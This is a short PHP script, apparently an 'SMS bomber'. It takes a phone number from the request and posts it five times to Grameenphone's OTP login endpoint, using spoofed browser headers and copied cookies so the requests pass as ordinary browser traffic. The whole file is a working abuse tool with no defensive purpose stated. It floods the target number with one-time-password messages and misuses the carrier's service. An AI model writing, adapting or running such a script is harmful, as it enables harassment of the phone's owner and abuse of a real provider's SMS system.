<?php

// Get phone number from request
$phoneNumber = $_REQUEST["phone"];

$url = 'https://weblogin.grameenphone.com/backend/api/v1/otp';

$data = array(
    'msisdn' => $phoneNumber
);

$headers = array(
    'Accept: application/json, text/plain, */*',
    'Accept-Language: en-US,en;q=0.9,ru;q=0.8',
    'Connection: keep-alive',
    'Content-Type: application/json',
    'Cookie: _ga=GA1.1.811196194.1715594922; _ga_YKH9SKG3JM=GS1.1.1715594921.1.0.1715594925.56.0.0',
    'Origin: https://weblogin.grameenphone.com',
    'Referer: https://weblogin.grameenphone.com/?referrer=https://www.grameenphone.com/flexi-plan/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"'
);

// Number of times to send the request
$numberOfRequests = 5;

for ($i = 0; $i < $numberOfRequests; $i++) {
    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo 'Error: ' . curl_error($ch);
    } else {
        echo 'Response ' . ($i + 1) . ': ' . $response . '<br>';
    }

    curl_close($ch);
}

?>
